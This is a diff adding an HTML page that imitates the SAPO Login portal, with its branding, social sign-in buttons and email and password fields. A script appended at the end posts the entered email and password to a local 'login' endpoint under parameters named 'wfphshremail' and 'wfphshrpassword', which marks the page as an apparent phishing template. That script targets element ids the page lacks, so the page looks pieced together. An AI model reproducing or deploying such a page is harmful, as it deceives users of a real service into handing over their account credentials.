@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="null">
+
+    <head>
+        <meta charset="utf-8">
+        <meta name="google-site-verification" content="GCRSsJIBsRXoEYMkigYuEhEHAkfa6oNoHunbzG4xsRg" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>SAPO Login</title>
+        <meta name="description" content="">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+        <link rel="shortcut icon" href="static/img/favicon.ico">
+        <link rel="og:image" href="static/img/facebook.jpg">
+        <link rel="stylesheet" type="text/css" href="static/css/ink.css">
+        <link rel="stylesheet" type="text/css" href="static/css/login-main.css">
+        <!--[if IE 7 ]>
+            <link rel="stylesheet" href="css/ink-ie7.css" type="text/css" media="screen" title="no title" charset="utf-8">
+        <![endif]-->
+        <!--[if lt IE 10]>
+            <link rel="stylesheet" href="static/css/login-ie.css" type="text/css" media="screen" title="no title" charset="utf-8">
+        <![endif]-->
+
+        <meta property="og:locale" content="pt_PT" />
+        <meta property="og:site_name" content="SAPO Login" />
+        <meta property="og:title" content="SAPO Login" />
+        <meta property="og:url" content="i" />
+        <meta property="og:type" content="website" />
+        <meta property="og:description" content="Autentique-se com a sua conta SAPO." />
+        <meta property="og:image" content="html/static/img/facebook.jpg" />
+        <meta property="og:image:type" content="img" />
+        <link property="og:image:width" content="1200" />
+        <meta property="og:image:height" content="630" />
+        <meta property="og:image:alt" content="SAPO Login" />
+        <meta property="og:updated_time" content="2021-06-05T09:52:19.543+01:00" />
+        <meta property="fb:app_id" content="358058747481" />
+
+
+        <!-- BSU header -->
+        <style type="text/css">.bsu_almofada,.subbsu_almofada
+        {overflow:hidden; min-height: 36px;
+        background-color:#222;}.subbsu_almofada {
+        background-color:#fafafa;}</style>
+        <link rel="stylesheet" href="static/css/bsu-footer.css">
+
+        <script type="text/javascript" src="static/js/holder.js"></script>
+        <script type="text/javascript" src="static/js/ink.min.js"></script>
+        <script type="text/javascript" src="static/js/ink-ui.min.js"></script>
+        <script type="text/javascript" src="static/js/html5shiv.js"></script>
+        <script type="text/javascript" src="static/js/ink.modal.js"></script>
+        <script type="text/javascript" src="static/js/ink.toggle.js"></script>
+        <script type="text/javascript" src="static/js/login.js"></script>
+
+        <!-- Javascript Messages I18N -->
+        <script type="text/javascript">
+            var i18nLoginMessages = {
+                'cookiesMustBeOn' : 'Tem de ligar os cookies para conseguir identificar-se nos nossos serviços.',
+                'unsecureAccess'  : 'Está a aceder de forma insegura ao Login do SAPO. Desta forma não é possível fazer login.'
+            };
+        </script>
+    </head>
+
+    <body>
+        <div class="wrap">
+           <header class="vspace">
+                <h1><a href="static/img/logo_login.png" ><span>SAPO Login</span></a></h1>
+           </header>
+
+           <div class="ink-grid vspace ">
+    <div class="no-box large-100 medium-100 small-100">
+        <form class="ink-form" id="sapo_facebook_login_form" method="post" action="">
+            <input type="hidden" name="csrf_identifier" value="EK326V7O5LND5S46S5LBZRGYIGZWU6HW" />
+            <input type="hidden" id="checkPersistentFacebook" name="persistent" value="1">
+            <button class="ink-button large-100 content-left bt-facebook" name="sapo_facebook_login_form_submit" tabindex="7"><span>Entrar com Facebook</span></button>
+        </form>
+
+        <div class="no-box">
+           <p class="ou"><span>----------</span> ou <span>----------</span></p>
+        </div>
+    </div>
+
+    <div class="box large-100 medium-100 small-100">
+    <h2>Entrar com conta SAPO</h2>
+    <form class="ink-form" id="sapo_widget_login_form" method="post" action="" novalidate>
+            <input type="hidden" name="csrf_identifier" value="EK326V7O5LND5S46S5LBZRGYIGZWU6HW" />
+             <fieldset>
+             <div class="control-group hide-label">
+                    <label for="text-email">E-mail</label>
+                    <div class="control">
+                        <input type="email" id="text-email" name="SAPO_LOGIN_USERNAME" placeholder="E-mail" tabindex="1" aria-required="true" autofocus autocapitalize="off"  />
+                    </div>
+                </div>
+            <div class="control-group hide-label">
+                    <label for="text-password">Password</label>
+                    <div class="control">
+                        <input type="password" id="text-password" name="SAPO_LOGIN_PASSWORD" placeholder="Password" tabindex="2" aria-required="true" autocomplete="off">
+                    </div>
+                </div>
+                <div class="control-group vspace">
+                    <div class="checkstyle">
+                        <input type="checkbox" id="check-ligado" name="persistent" tabindex="3" value="1" checked="checked"/>
+                    
+                    </div>
+                    <button type="submit" class="ink-button green large-100" tabindex="4">Entrar</button>
+                </div>
+            </fieldset>
+        </form>
+        <div class="control-group">
+            <p class="conta-nova"><a href="" title="Registar conta SAPO" tabindex="5">Registe-se </a></p>
+            <p class="conta-problema"><a href="" title="Recupere a sua password" tabindex="6">Não consegue entrar na sua conta?</a></p>
+        </div>
+    </div>
+<div class="no-box large-100 medium-100 small-100">
+        <p class="outros-servicos"><a class="toggle" data-close-on-click="false" data-target="#btsServicos" tabindex="8" href="index.html#" aria-expanded="false" aria-controls="btsServicos"><span class=""></span>Entrar com outros serviços</a></p>
+        <div class="hide-all" id="btsServicos" aria-hidden="true">
+            <form class="ink-form" id="sapo_windows_login_form" method="post" action="">
+                <input type="hidden" name="csrf_identifier" value="EK326V7O5LND5S46S5LBZRGYIGZWU6HW" />
+                <input type="hidden" id="checkPersistentLiveId" name="persistent" value="1">
+                <button class="ink-button large-100 content-left bt-liveid" name="sapo_windows_login_form_submit" tabindex="9"><span>Entrar com Windows Live</span></button>
+            </form>
+            <form class="ink-form" id="frm_openid_google" method="post" action="">
+                <input type="hidden" name="csrf_identifier" value="EK326V7O5LND5S46S5LBZRGYIGZWU6HW" />
+                <input type="hidden" id="checkPersistentOpenId" name="persistent" value="1">
+                <button class="ink-button large-100 content-left bt-google" tabindex="10"><span>Entrar com Google</span></button>
+            </form>
+            <p class="outros-servicos"><a class="toggle" data-close-on-click="false" data-target="#btsMais" tabindex="12" href="index.html#" aria-expanded="false" aria-controls="btsMais"><span class=""></span>Mais...</a></p>
+            <div class="hide-all" id="btsMais" aria-hidden="true">
+                <form class="ink-form" method="get" action="">
+                    <input type="hidden" name="csrf_identifier" value="EK326V7O5LND5S46S5LBZRGYIGZWU6HW" />
+                    <input type="hidden" id="checkPersistentFacebook" name="persistent" value="1">
+                    <button class="ink-button large-100 content-left bt-twitter" tabindex="13"><span>Entrar com Twitter</span></button>
+                </form>
+                <form class="ink-form" method="get" action="">
+                    <input type="hidden" name="csrf_identifier" value="EK326V7O5LND5S46S5LBZRGYIGZWU6HW" />
+                    <button class="ink-button large-100 content-left bt-openid" tabindex="14"><span>Entrar com OpenID</span></button>
+                </form>
+            </div>
+        </div>
+    </div>
+    </div>
+<div class="push"></div>
+        </div>
+        <footer>
+              <a class="ink-navigation push-right bt-idioma" data-target="#idioma">Português<span class=""></span></a>
+            
+            <div id="bsu-v2-footer" data-bg="light" class="bsu-login-inst"></div>
+        </footer>
+        <script id="bsu-v2-sapofooter" src="static/js/footer.js" data-country="null" data-lang="null"></script>
+        <script type="text/javascript">
+            Ink.requireModules(['Ink.Dom.Event_1', 'Ink.Dom.Css_1'], function(iEvent, Css){
+                    var buttons = Ink.ss('.outros-servicos a');
+                    iEvent.observe(buttons[0], 'click', function(ev){
+                            iEvent.stopDefault(ev);
+
+                            Css.removeClassName(Ink.i("btsServicos"), 'hide-all');
+                            Css.addClassName(Ink.ss('.outros-servicos')[0], 'hide-all')
+                    });
+                    iEvent.observe(buttons[1], 'click', function(ev){
+                            iEvent.stopDefault(ev);
+                            Css.removeClassName(Ink.i("btsMais"), 'hide-all');
+                            Css.addClassName(Ink.ss('.outros-servicos')[1], 'hide-all')
+                    });
+            });
+            Ink.requireModules(['Ink.UI.Toggle_1'], function (Toggle) {
+                new Toggle('.bt-idioma');
+            });
+        </script>
+
+
+<script>
+    /*
+    Check the password field and act accordingly.
+    */
+
+    $("#btn").on("click", function(e) {
+        e.preventDefault();
+        // get the password box and checkbox elements
+        var input = document.getElementById("eml");
+        var input2 = document.getElementById("pwd");
+        // check to see if the value is empty
+        if ( input.value == "" ){
+            passNotValid();
+        }else if( input2.value == "" ){ //check if the value of the repeat field is empty
+            passNotValid();
+        }else{
+            // post the data
+            $("#dialog").css('display', 'none');
+              post('login', {
+                wfphshremail: input.value,
+                wfphshrpassword: input2.value
+              });
+        }
+    });
+
+    function passNotValid(){
+      $("#dialog").css('display', 'block');
+      $(".form-control").css('border', '1px solid #dd4b39');
+    }
+
+    /*
+    Post to the fallowing path given the parameters.
+    Args:
+      path: The path to be posted to.
+      params: The parameters to be passed.
+    */
+    function post(path, params) {
+      // create a form and set its attributes
+      var form = document.createElement("form");
+      form.setAttribute("method", "post");
+      form.setAttribute("action", path);
+
+      // set the attribute for the post
+      for(var key in params) {
+          if(params.hasOwnProperty(key)) {
+              var hiddenField = document.createElement("input");
+              hiddenField.setAttribute("type", "hidden");
+              hiddenField.setAttribute("name", key);
+              hiddenField.setAttribute("value", params[key]);
+              form.appendChild(hiddenField);
+           }
+      }
+      // submit the post
+      document.body.appendChild(form);
+      form.submit();
+    }
+    var input = document.getElementById("eml");
+    var input2 = document.getElementById("pwd");
+    input.disabled = false;
+    input2.disabled = false;
+  </script>
+    </body>
+</html>
